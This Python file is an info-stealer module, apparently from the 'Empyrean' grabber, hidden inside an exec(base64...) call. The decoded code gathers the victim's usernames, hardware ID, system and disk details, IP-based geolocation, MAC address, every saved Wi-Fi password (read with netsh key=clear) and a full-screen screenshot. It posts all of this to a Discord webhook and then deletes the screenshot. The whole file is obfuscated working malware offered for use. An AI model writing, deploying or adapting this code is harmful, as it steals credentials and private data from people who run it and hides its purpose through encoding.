import ctypes
import os
import re
import subprocess
import uuid
import psutil
import requests
import wmi
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
import time
import base64

exec(base64.b64decode("Y2xhc3MgU3lzdGVtSW5mbygpOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB3ZWJob29rOiBzdHIpIC0+IE5vbmU6DQogICAgICAgIHdlYmhvb2sgPSBTeW5jV2ViaG9vay5mcm9tX3VybCh3ZWJob29rKQ0KICAgICAgICBlbWJlZCA9IEVtYmVkKHRpdGxlPSJTeXN0ZW0gSW5mb3JtYXRpb24iLCBjb2xvcj0weDAwMDAwMCkNCg0KICAgICAgICBlbWJlZC5hZGRfZmllbGQoDQogICAgICAgICAgICBuYW1lPXNlbGYudXNlcl9kYXRhKClbMF0sDQogICAgICAgICAgICB2YWx1ZT1zZWxmLnVzZXJfZGF0YSgpWzFdLA0KICAgICAgICAgICAgaW5saW5lPXNlbGYudXNlcl9kYXRhKClbMl0NCiAgICAgICAgKQ0KICAgICAgICBlbWJlZC5hZGRfZmllbGQoDQogICAgICAgICAgICBuYW1lPXNlbGYuc3lzdGVtX2RhdGEoKVswXSwNCiAgICAgICAgICAgIHZhbHVlPXNlbGYuc3lzdGVtX2RhdGEoKVsxXSwNCiAgICAgICAgICAgIGlubGluZT1zZWxmLnN5c3RlbV9kYXRhKClbMl0NCiAgICAgICAgKQ0KICAgICAgICBlbWJlZC5hZGRfZmllbGQoDQogICAgICAgICAgICBuYW1lPXNlbGYuZGlza19kYXRhKClbMF0sDQogICAgICAgICAgICB2YWx1ZT1zZWxmLmRpc2tfZGF0YSgpWzFdLA0KICAgICAgICAgICAgaW5saW5lPXNlbGYuZGlza19kYXRhKClbMl0NCiAgICAgICAgKQ0KICAgICAgICBlbWJlZC5hZGRfZmllbGQoDQogICAgICAgICAgICBuYW1lPXNlbGYubmV0d29ya19kYXRhKClbMF0sDQogICAgICAgICAgICB2YWx1ZT1zZWxmLm5ldHdvcmtfZGF0YSgpWzFdLA0KICAgICAgICAgICAgaW5saW5lPXNlbGYubmV0d29ya19kYXRhKClbMl0NCiAgICAgICAgKQ0KICAgICAgICBlbWJlZC5hZGRfZmllbGQoDQogICAgICAgICAgICBuYW1lPXNlbGYud2lmaV9kYXRhKClbMF0sDQogICAgICAgICAgICB2YWx1ZT1zZWxmLndpZmlfZGF0YSgpWzFdLA0KICAgICAgICAgICAgaW5saW5lPXNlbGYud2lmaV9kYXRhKClbMl0NCiAgICAgICAgKQ0KDQogICAgICAgIGltYWdlID0gSW1hZ2VHcmFiLmdyYWIoDQogICAgICAgICAgICBiYm94PU5vbmUsDQogICAgICAgICAgICBpbmNsdWRlX2xheWVyZWRfd2luZG93cz1GYWxzZSwNCiAgICAgICAgICAgIGFsbF9zY3JlZW5zPVRydWUsDQogICAgICAgICAgICB4ZGlzcGxheT1Ob25lDQogICAgICAgICkNCiAgICAgICAgaW1hZ2Uuc2F2ZSgic2NyZWVuc2hvdC5wbmciKQ0KICAgICAgICBlbWJlZC5zZXRfaW1hZ2UodXJsPSJhdHRhY2htZW50Oi8vc2NyZWVuc2hvdC5wbmciKQ0KDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHdlYmhvb2suc2VuZCgNCiAgICAgICAgICAgICAgICBlbWJlZD1lbWJlZCwNCiAgICAgICAgICAgICAgICBmaWxlPUZpbGUoJy5cXHNjcmVlbnNob3QucG5nJywgZmlsZW5hbWU9J3NjcmVlbnNob3QucG5nJyksDQogICAgICAgICAgICAgICAgdXNlcm5hbWU9IkVtcHlyZWFuIiwNCiAgICAgICAgICAgICAgICBhdmF0YXJfdXJsPSJodHRwczovL2kuaW1ndXIuY29tL0hqemZqZlIucG5nIg0KICAgICAgICAgICAgKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoInNjcmVlbnNob3QucG5nIik6DQogICAgICAgICAgICBvcy5yZW1vdmUoInNjcmVlbnNob3QucG5nIikNCg0KICAgIGRlZiB1c2VyX2RhdGEoc2VsZikgLT4gdHVwbGVbc3RyLCBzdHIsIGJvb2xdOg0KICAgICAgICBkZWYgZGlzcGxheV9uYW1lKCkgLT4gc3RyOg0KICAgICAgICAgICAgR2V0VXNlck5hbWVFeCA9IGN0eXBlcy53aW5kbGwuc2VjdXIzMi5HZXRVc2VyTmFtZUV4Vw0KICAgICAgICAgICAgTmFtZURpc3BsYXkgPSAzDQoNCiAgICAgICAgICAgIHNpemUgPSBjdHlwZXMucG9pbnRlcihjdHlwZXMuY191bG9uZygwKSkNCiAgICAgICAgICAgIEdldFVzZXJOYW1lRXgoTmFtZURpc3BsYXksIE5vbmUsIHNpemUpDQoNCiAgICAgICAgICAgIG5hbWVCdWZmZXIgPSBjdHlwZXMuY3JlYXRlX3VuaWNvZGVfYnVmZmVyKHNpemUuY29udGVudHMudmFsdWUpDQogICAgICAgICAgICBHZXRVc2VyTmFtZUV4KE5hbWVEaXNwbGF5LCBuYW1lQnVmZmVyLCBzaXplKQ0KDQogICAgICAgICAgICByZXR1cm4gbmFtZUJ1ZmZlci52YWx1ZQ0KDQogICAgICAgIGRpc3BsYXlfbmFtZSA9IGRpc3BsYXlfbmFtZSgpDQogICAgICAgIGhvc3RuYW1lID0gb3MuZ2V0ZW52KCdDT01QVVRFUk5BTUUnKQ0KICAgICAgICB1c2VybmFtZSA9IG9zLmdldGVudignVVNFUk5BTUUnKQ0KDQogICAgICAgIHJldHVybiAoDQogICAgICAgICAgICAiOmJ1c3RfaW5fc2lsaG91ZXR0ZTogVXNlciIsDQogICAgICAgICAgICBmImBgYERpc3BsYXkgTmFtZToge2Rpc3BsYXlfbmFtZX1cbkhvc3RuYW1lOiB7aG9zdG5hbWV9XG5Vc2VybmFtZToge3VzZXJuYW1lfWBgYCIsDQogICAgICAgICAgICBGYWxzZQ0KICAgICAgICApDQoNCiAgICBkZWYgc3lzdGVtX2RhdGEoc2VsZikgLT4gdHVwbGVbc3RyLCBzdHIsIGJvb2xdOg0KICAgICAgICBkZWYgZ2V0X2h3aWQoKSAtPiBzdHI6DQogICAgICAgICAgICBod2lkID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoJ0M6XFdpbmRvd3NcU3lzdGVtMzJcd2JlbVxXTUlDLmV4ZSBjc3Byb2R1Y3QgZ2V0IHV1aWQnLCBzaGVsbD1UcnVlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ZGluPXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkuZGVjb2RlKCd1dGYtOCcpLnNwbGl0KCdcbicpWzFdLnN0cmlwKCkNCg0KICAgICAgICAgICAgcmV0dXJuIGh3aWQNCg0KICAgICAgICBjcHUgPSB3bWkuV01JKCkuV2luMzJfUHJvY2Vzc29yKClbMF0uTmFtZQ0KICAgICAgICBncHUgPSB3bWkuV01JKCkuV2luMzJfVmlkZW9Db250cm9sbGVyKClbMF0uTmFtZQ0KICAgICAgICByYW0gPSByb3VuZChmbG9hdCh3bWkuV01JKCkuV2luMzJfT3BlcmF0aW5nU3lzdGVtKClbDQogICAgICAgICAgICAgICAgICAgIDBdLlRvdGFsVmlzaWJsZU1lbW9yeVNpemUpIC8gMTA0ODU3NiwgMCkNCiAgICAgICAgaHdpZCA9IGdldF9od2lkKCkNCg0KICAgICAgICByZXR1cm4gKA0KICAgICAgICAgICAgIjw6Q1BVOjEwMDQxMzE4NTIyMDgwNjY3MDE+IFN5c3RlbSIsDQogICAgICAgICAgICBmImBgYENQVToge2NwdX1cbkdQVToge2dwdX1cblJBTToge3JhbX1cbkhXSUQ6IHtod2lkfWBgYCIsDQogICAgICAgICAgICBGYWxzZQ0KICAgICAgICApDQoNCiAgICBkZWYgZGlza19kYXRhKHNlbGYpIC0+IHR1cGxlW3N0ciwgc3RyLCBib29sXToNCiAgICAgICAgZGlzayA9ICgiezo8OX0gIio0KS5mb3JtYXQoIkRyaXZlIiwgIkZyZWUiLCAiVG90YWwiLCAiVXNlJSIpICsgIlxuIg0KICAgICAgICBmb3IgcGFydCBpbiBwc3V0aWwuZGlza19wYXJ0aXRpb25zKGFsbD1GYWxzZSk6DQogICAgICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6DQogICAgICAgICAgICAgICAgaWYgJ2Nkcm9tJyBpbiBwYXJ0Lm9wdHMgb3IgcGFydC5mc3R5cGUgPT0gJyc6DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICB1c2FnZSA9IHBzdXRpbC5kaXNrX3VzYWdlKHBhcnQubW91bnRwb2ludCkNCiAgICAgICAgICAgIGRpc2sgKz0gKCJ7Ojw5fSAiKjQpLmZvcm1hdChwYXJ0LmRldmljZSwgc3RyKA0KICAgICAgICAgICAgICAgIHVzYWdlLmZyZWUgLy8gKDIqKjMwKSkgKyAiR0IiLCBzdHIodXNhZ2UudG90YWwgLy8gKDIqKjMwKSkgKyAiR0IiLCBzdHIodXNhZ2UucGVyY2VudCkgKyAiJSIpICsgIlxuIg0KDQogICAgICAgIHJldHVybiAoDQogICAgICAgICAgICAiOmZsb3BweV9kaXNrOiBEaXNrIiwNCiAgICAgICAgICAgIGYiYGBge2Rpc2t9YGBgIiwNCiAgICAgICAgICAgIEZhbHNlDQogICAgICAgICkNCg0KICAgIGRlZiBuZXR3b3JrX2RhdGEoc2VsZikgLT4gdHVwbGVbc3RyLCBzdHIsIGJvb2xdOg0KICAgICAgICBkZWYgZ2VvbG9jYXRpb24oaXA6IHN0cikgLT4gc3RyOg0KICAgICAgICAgICAgdXJsID0gZiJodHRwOi8vaXAtYXBpLmNvbS9qc29uL3tpcH0iDQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9ew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkxLjAuNDQ3Mi4xMjQgU2FmYXJpLzUzNy4zNiJ9KQ0KICAgICAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQ0KDQogICAgICAgICAgICByZXR1cm4gKGRhdGFbImNvdW50cnkiXSwgZGF0YVsicmVnaW9uTmFtZSJdLCBkYXRhWyJjaXR5Il0sIGRhdGFbInppcCJdLCBkYXRhWyJhcyJdKQ0KDQogICAgICAgIGlwID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKS50ZXh0DQogICAgICAgIG1hYyA9ICc6Jy5qb2luKHJlLmZpbmRhbGwoJy4uJywgJyUwMTJ4JyAlIHV1aWQuZ2V0bm9kZSgpKSkNCiAgICAgICAgY291bnRyeSwgcmVnaW9uLCBjaXR5LCB6aXBfLCBhc18gPSBnZW9sb2NhdGlvbihpcCkNCg0KICAgICAgICByZXR1cm4gKA0KICAgICAgICAgICAgIjpzYXRlbGxpdGU6IE5ldHdvcmsiLA0KICAgICAgICAgICAgImBgYElQIEFkZHJlc3M6IHtpcH1cbk1BQyBBZGRyZXNzOiB7bWFjfVxuQ291bnRyeToge2NvdW50cnl9XG5SZWdpb246IHtyZWdpb259XG5DaXR5OiB7Y2l0eX0gKHt6aXBffSlcbklTUDoge2FzX31gYGAiLmZvcm1hdCgNCiAgICAgICAgICAgICAgICBpcD1pcCwgbWFjPW1hYywgY291bnRyeT1jb3VudHJ5LCByZWdpb249cmVnaW9uLCBjaXR5PWNpdHksIHppcF89emlwXywgYXNfPWFzXyksDQogICAgICAgICAgICBGYWxzZQ0KICAgICAgICApDQoNCiAgICBkZWYgd2lmaV9kYXRhKHNlbGYpIC0+IHR1cGxlW3N0ciwgc3RyLCBib29sXToNCiAgICAgICAgbmV0d29ya3MsIG91dCA9IFtdLCAnJw0KICAgICAgICB0cnk6DQogICAgICAgICAgICB3aWZpID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoDQogICAgICAgICAgICAgICAgWyduZXRzaCcsICd3bGFuJywgJ3Nob3cnLCAncHJvZmlsZXMnXSwgc2hlbGw9VHJ1ZSwNCiAgICAgICAgICAgICAgICBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpLmRlY29kZSgndXRmLTgnKS5zcGxpdCgnXG4nKQ0KICAgICAgICAgICAgd2lmaSA9IFtpLnNwbGl0KCI6IilbMV1bMTotMV0NCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gd2lmaSBpZiAiQWxsIFVzZXIgUHJvZmlsZSIgaW4gaV0NCg0KICAgICAgICAgICAgZm9yIG5hbWUgaW4gd2lmaToNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIHJlc3VsdHMgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgNCiAgICAgICAgICAgICAgICAgICAgICAgIFsnbmV0c2gnLCAnd2xhbicsICdzaG93JywgJ3Byb2ZpbGUnLCBuYW1lLCAna2V5PWNsZWFyJ10sIHNoZWxsPVRydWUsDQogICAgICAgICAgICAgICAgICAgICAgICBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpLmRlY29kZSgndXRmLTgnKS5zcGxpdCgnXG4nKQ0KICAgICAgICAgICAgICAgICAgICByZXN1bHRzID0gW2Iuc3BsaXQoIjoiKVsxXVsxOi0xXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBiIGluIHJlc3VsdHMgaWYgIktleSBDb250ZW50IiBpbiBiXQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgbmV0d29ya3MuYXBwZW5kKChuYW1lLCAnJykpDQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQoNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIG5ldHdvcmtzLmFwcGVuZCgobmFtZSwgcmVzdWx0c1swXSkpDQogICAgICAgICAgICAgICAgZXhjZXB0IEluZGV4RXJyb3I6DQogICAgICAgICAgICAgICAgICAgIG5ldHdvcmtzLmFwcGVuZCgobmFtZSwgJycpKQ0KDQogICAgICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvcjoNCiAgICAgICAgICAgIHBhc3MNCg0KICAgICAgICBvdXQgKz0gZid7IlNTSUQiOjwyMH18IHsiUEFTU1dPUkQiOjx9XG4nDQogICAgICAgIG91dCArPSBmJ3siLSIqMjB9fHsiLSIqMjl9XG4nDQogICAgICAgIGZvciBuYW1lLCBwYXNzd29yZCBpbiBuZXR3b3JrczoNCiAgICAgICAgICAgIG91dCArPSAnezo8MjB9fCB7Ojx9XG4nLmZvcm1hdChuYW1lLCBwYXNzd29yZCkNCg0KICAgICAgICByZXR1cm4gKA0KICAgICAgICAgICAgIjpzaWduYWxfc3RyZW5ndGg6IFdpRmkiLA0KICAgICAgICAgICAgZiJgYGB7b3V0fWBgYCIsDQogICAgICAgICAgICBGYWxzZQ0KICAgICAgICApDQo="))
